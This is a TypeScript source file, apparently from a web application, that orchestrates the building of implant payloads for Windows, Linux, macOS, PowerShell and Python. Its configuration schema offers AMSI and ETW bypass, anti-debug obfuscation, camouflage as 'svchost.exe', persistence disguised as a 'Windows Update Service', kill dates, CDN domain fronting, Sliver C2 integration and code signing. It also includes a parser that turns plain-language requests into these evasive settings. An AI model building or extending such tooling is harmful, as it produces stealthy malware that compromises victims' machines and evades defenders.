import { z } from "zod"
import { randomUUID } from "crypto"
import { createPayloadBuild as createDbPayloadBuild, updatePayloadBuildStatus, getPayloadBuildById } from "@/lib/db/payload-builds"
import { buildWindowsExe } from "@/lib/payloads/builders/windows"
import { buildLinuxElf } from "@/lib/payloads/builders/linux"
import { buildMacosApp } from "@/lib/payloads/builders/macos"
import { buildPowerShell } from "@/lib/payloads/builders/powershell"
import { buildPython } from "@/lib/payloads/builders/python"
import { generateDockerfile, generateDockerCompose, generateK8sDeployment } from "@/lib/payloads/builders/deployment"
import { writeFile } from "fs/promises"
import { tmpdir } from "os"
import { join } from "path"

/* ------------------------------------------------------------------ */
/*  Types & Schemas                                                   */
/* ------------------------------------------------------------------ */

export const PayloadType = z.enum(["windows_exe", "linux_elf", "macos_app", "powershell", "python"])
export type PayloadType = z.infer<typeof PayloadType>

export const PayloadStatus = z.enum(["pending", "building", "ready", "failed"])
export type PayloadStatus = z.infer<typeof PayloadStatus>

export const PayloadConfig = z.object({
  type: PayloadType,
  platform: z.enum(["windows", "linux", "macos", "cross-platform"]).optional(),
  name: z.string().min(1).max(100),
  description: z.string().max(500).optional(),
  hysteriaConfig: z.object({
    server: z.string(),
    auth: z.string(),
    sni: z.string().optional(),
    insecure: z.boolean().default(false),
    obfsType: z.enum(["none", "salamander"]).default("none"),
    obfsPassword: z.string().optional(),
    masquerade: z.string().optional(),
    bandwidthUp: z.string().optional(),
    bandwidthDown: z.string().optional(),
    tunEnabled: z.boolean().default(false),
    socksListen: z.string().optional(),
  }),
  obfuscation: z.object({
    enabled: z.boolean().default(false),
    level: z.enum(["light", "medium", "heavy"]).default("medium"),
    techniques: z.array(z.enum(["string_encode", "variable_rename", "control_flow", "anti_debug", "amsi_bypass", "etw_bypass"])).default([]),
  }).default({ enabled: false, level: "medium", techniques: [] }),
  features: z.object({
    autoReconnect: z.boolean().default(true),
    heartbeat: z.number().default(30),
    fallbackServers: z.array(z.string()).default([]),
  }).default({ autoReconnect: true, heartbeat: 30, fallbackServers: [] }),
  signing: z.object({
    enabled: z.boolean().default(false),
    certificateId: z.string().optional(),
  }).default({ enabled: false }),
  packing: z.object({
    enabled: z.boolean().default(false),
    method: z.enum(["upx", "custom", "none"]).default("none"),
    compressionLevel: z.number().min(1).max(9).default(6),
  }).default({ enabled: false, method: "none", compressionLevel: 6 }),

  camouflage: z.object({
    enabled: z.boolean().default(false),
    binaryName: z.string().default("svchost.exe"),
  }).default({ enabled: false, binaryName: "svchost.exe" }),

  persistence: z.object({
    enabled: z.boolean().default(false),
    method: z.enum(["none", "registry", "systemd", "launchd", "cron"]).default("none"),
    serviceName: z.string().default("WindowsUpdate"),
    serviceDescription: z.string().default("Windows Update Service"),
  }).default({ enabled: false, method: "none", serviceName: "WindowsUpdate", serviceDescription: "Windows Update Service" }),

  deadManSwitch: z.object({
    enabled: z.boolean().default(false),
    killDate: z.string().optional(),
    checkInTimeoutHours: z.number().default(72),
  }).default({ enabled: false, checkInTimeoutHours: 72 }),

  cdnFront: z.object({
    enabled: z.boolean().default(false),
    frontDomain: z.string().default(""),
    realHost: z.string().default(""),
  }).default({ enabled: false, frontDomain: "", realHost: "" }),

  sliverC2: z.object({
    enabled: z.boolean().default(false),
    listenerUrl: z.string().default(""),
    localSocksPort: z.number().default(10080),
  }).default({ enabled: false, listenerUrl: "", localSocksPort: 10080 }),

  deployment: z.object({
    windowsGui: z.boolean().default(false),
    generateDocker: z.boolean().default(false),
    generateK8s: z.boolean().default(false),
  }).default({ windowsGui: false, generateDocker: false, generateK8s: false }),
})
export type PayloadConfig = z.infer<typeof PayloadConfig>

export type PayloadBuild = {
  id: string
  type: PayloadType
  platform?: string
  name: string
  description?: string
  status: PayloadStatus
  config: PayloadConfig
  downloadUrl?: string
  sizeBytes?: number
  buildLogs: string[]
  errorMessage?: string
  createdAt: number
  updatedAt: number
  completedAt?: number
}

/* ------------------------------------------------------------------ */
/*  Core Generator                                                    */
/* ------------------------------------------------------------------ */

export async function createPayloadBuild(
  config: PayloadConfig,
  createdBy: string
): Promise<PayloadBuild> {
  const dbBuild = await createDbPayloadBuild({
    name: config.name,
    type: config.type,
    platform: config.platform,
    description: config.description,
    config: config as any,
    obfuscationLevel: config.obfuscation.enabled ? (config.obfuscation.level === "light" ? 1 : config.obfuscation.level === "medium" ? 2 : 3) : 0,
    packingMethod: config.packing.enabled ? config.packing.method : null,
    createdBy,
  })

  // Start async build
  startBuildProcess(dbBuild.id, config)

  return {
    id: dbBuild.id,
    type: dbBuild.type as PayloadType,
    platform: dbBuild.platform as any,
    name: dbBuild.name,
    description: dbBuild.description ?? undefined,
    status: dbBuild.status as PayloadStatus,
    config: dbBuild.config as PayloadConfig,
    downloadUrl: dbBuild.downloadUrl ?? undefined,
    sizeBytes: dbBuild.sizeBytes ? Number(dbBuild.sizeBytes) : undefined,
    buildLogs: dbBuild.buildLogs as string[],
    errorMessage: dbBuild.errorMessage ?? undefined,
    createdAt: dbBuild.createdAt,
    updatedAt: dbBuild.updatedAt,
    completedAt: dbBuild.completedAt ?? undefined,
  }
}

export async function getPayloadBuild(id: string): Promise<PayloadBuild | null> {
  const dbBuild = await getPayloadBuildById(id)
  if (!dbBuild) return null

  return {
    id: dbBuild.id,
    type: dbBuild.type as PayloadType,
    name: dbBuild.name,
    description: dbBuild.description ?? undefined,
    status: dbBuild.status as PayloadStatus,
    config: dbBuild.config as PayloadConfig,
    downloadUrl: dbBuild.downloadUrl ?? undefined,
    sizeBytes: dbBuild.sizeBytes ? Number(dbBuild.sizeBytes) : undefined,
    buildLogs: dbBuild.buildLogs as string[],
    errorMessage: dbBuild.errorMessage ?? undefined,
    createdAt: dbBuild.createdAt,
    updatedAt: dbBuild.updatedAt,
    completedAt: dbBuild.completedAt ?? undefined,
  }
}

export async function listPayloadBuilds(createdBy?: string, limit = 50): Promise<PayloadBuild[]> {
  // This is now handled by the database layer
  // This function is kept for backward compatibility
  const { listPayloadBuilds: dbList } = await import("@/lib/db/payload-builds")
  const dbBuilds = await dbList(createdBy, limit)
  
  return dbBuilds.map(dbBuild => ({
    id: dbBuild.id,
    type: dbBuild.type as PayloadType,
    name: dbBuild.name,
    description: dbBuild.description ?? undefined,
    status: dbBuild.status as PayloadStatus,
    config: dbBuild.config as PayloadConfig,
    downloadUrl: dbBuild.downloadUrl ?? undefined,
    sizeBytes: dbBuild.sizeBytes ? Number(dbBuild.sizeBytes) : undefined,
    buildLogs: dbBuild.buildLogs,
    errorMessage: dbBuild.errorMessage ?? undefined,
    createdAt: dbBuild.createdAt,
    updatedAt: dbBuild.updatedAt,
    completedAt: dbBuild.completedAt ?? undefined,
  }))
}

export async function deletePayloadBuild(id: string): Promise<boolean> {
  const { deletePayloadBuild: dbDelete } = await import("@/lib/db/payload-builds")
  return dbDelete(id)
}

/* ------------------------------------------------------------------ */
/*  Build Engine                                                      */
/* ------------------------------------------------------------------ */

async function startBuildProcess(id: string, config: PayloadConfig): Promise<void> {
  await updatePayloadBuildStatus(id, "building", "Starting build process...")

  try {
    switch (config.type) {
      case "windows_exe":
        await buildWindowsExe(id, config)
        break
      case "linux_elf":
        await buildLinuxElf(id, config)
        break
      case "macos_app":
        await buildMacosApp(id, config)
        break
      case "powershell":
        await buildPowerShell(id, config)
        break
      case "python":
        await buildPython(id, config)
        break
      default:
        throw new Error(`Unsupported payload type: ${config.type}`)
    }

    // Generate deployment artifacts if requested
    if (config.deployment?.generateDocker) {
      const dockerfile = generateDockerfile(config)
      const compose = generateDockerCompose(config)
      await writeFile(join(tmpdir(), `payload-${id}.Dockerfile`), dockerfile, "utf8")
      await writeFile(join(tmpdir(), `payload-${id}-compose.yml`), compose, "utf8")
      await updatePayloadBuildStatus(id, "building", `Docker artifacts written to /tmp/payload-${id}.Dockerfile`)
    }

    if (config.deployment?.generateK8s) {
      const k8s = generateK8sDeployment(config)
      await writeFile(join(tmpdir(), `payload-${id}-k8s.yml`), k8s, "utf8")
      await updatePayloadBuildStatus(id, "building", `K8s manifest written to /tmp/payload-${id}-k8s.yml`)
    }

    await updatePayloadBuildStatus(id, "ready", "Build completed successfully")
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : String(err)
    await updatePayloadBuildStatus(id, "failed", `Build failed: ${errorMsg}`)
  }
}

function updateBuildStatus(
  id: string,
  status: PayloadStatus,
  logMessage: string
): void {
  // This is now handled by updatePayloadBuildStatus
  // This function is kept for backward compatibility
  void updatePayloadBuildStatus(id, status, logMessage)
}

/* ------------------------------------------------------------------ */
/*  AI Payload Generation from Natural Language                       */
/* ------------------------------------------------------------------ */

export async function generatePayloadFromDescription(
  description: string,
  createdBy: string
): Promise<{ config: PayloadConfig; explanation: string }> {
  void createdBy
  // Parse natural language description to extract payload parameters
  const config = parsePayloadDescription(description)
  
  const explanation = generateExplanation(config)
  
  return { config, explanation }
}

function parsePayloadDescription(description: string): PayloadConfig {
  const lower = description.toLowerCase()
  
  // Detect platform
  let type: PayloadType = "windows_exe"
  if (lower.includes("linux") || lower.includes("elf")) {
    type = "linux_elf"
  } else if (lower.includes("mac") || lower.includes("darwin") || lower.includes("osx")) {
    type = "macos_app"
  } else if (lower.includes("powershell") || lower.includes("ps1") || lower.includes("windows") && lower.includes("script")) {
    type = "powershell"
  } else if (lower.includes("python") || lower.includes("py")) {
    type = "python"
  }
  
  // Detect obfuscation level
  const obfuscation: PayloadConfig["obfuscation"] = {
    enabled: lower.includes("obfuscat") || lower.includes("stealth") || lower.includes("hidden"),
    level: "medium",
    techniques: [],
  }
  
  if (obfuscation.enabled) {
    if (lower.includes("heavy") || lower.includes("strong")) {
      obfuscation.level = "heavy"
      obfuscation.techniques = ["string_encode", "variable_rename", "control_flow", "anti_debug"]
    } else if (lower.includes("light")) {
      obfuscation.level = "light"
      obfuscation.techniques = ["string_encode"]
    } else {
      obfuscation.techniques = ["string_encode", "variable_rename", "control_flow"]
    }
  }
  
  // Detect signing requirement
  const signing: PayloadConfig["signing"] = {
    enabled: lower.includes("sign") || lower.includes("certif"),
  }
  
  // Extract name from description
  const nameMatch = description.match(/(?:for|named?|called?)\s+["']?([^"']{2,50})["']?/i)
  const name = nameMatch?.[1] ?? `Auto-${type.replace("_", "-").toUpperCase()}`
  
  return {
    type,
    name,
    description: description.slice(0, 500),
    hysteriaConfig: {
      server: "auto-detect",
      auth: "auto-generate",
      sni: undefined,
      insecure: false,
      obfsType: "none" as const,
      obfsPassword: undefined,
      masquerade: undefined,
      bandwidthUp: undefined,
      bandwidthDown: undefined,
      tunEnabled: false,
      socksListen: undefined,
    },
    obfuscation,
    signing,
    features: {
      autoReconnect: true,
      heartbeat: 30,
      fallbackServers: [],
    },
    packing: {
      enabled: false,
      method: "none" as const,
      compressionLevel: 6,
    },
    camouflage: { enabled: false, binaryName: "svchost.exe" },
    persistence: { enabled: false, method: "none" as const, serviceName: "WindowsUpdate", serviceDescription: "Windows Update Service" },
    deadManSwitch: { enabled: false, checkInTimeoutHours: 72 },
    cdnFront: { enabled: false, frontDomain: "", realHost: "" },
    sliverC2: { enabled: false, listenerUrl: "", localSocksPort: 10080 },
    deployment: { windowsGui: false, generateDocker: false, generateK8s: false },
  }
}

function generateExplanation(config: PayloadConfig): string {
  const parts: string[] = []
  
  parts.push(`**Platform**: ${config.type.replace("_", " ").toUpperCase()}`)
  parts.push(`**Name**: ${config.name}`)
  
  if (config.obfuscation.enabled) {
    parts.push(`**Obfuscation**: ${config.obfuscation.level} level`)
    parts.push(`**Techniques**: ${config.obfuscation.techniques.join(", ") || "standard"}`)
  }
  
  if (config.signing.enabled) {
    parts.push(`**Code Signing**: Enabled`)
  }
  
  parts.push(`**Features**: Auto-reconnect, 30s heartbeat`)
  
  return parts.join("\n")
}
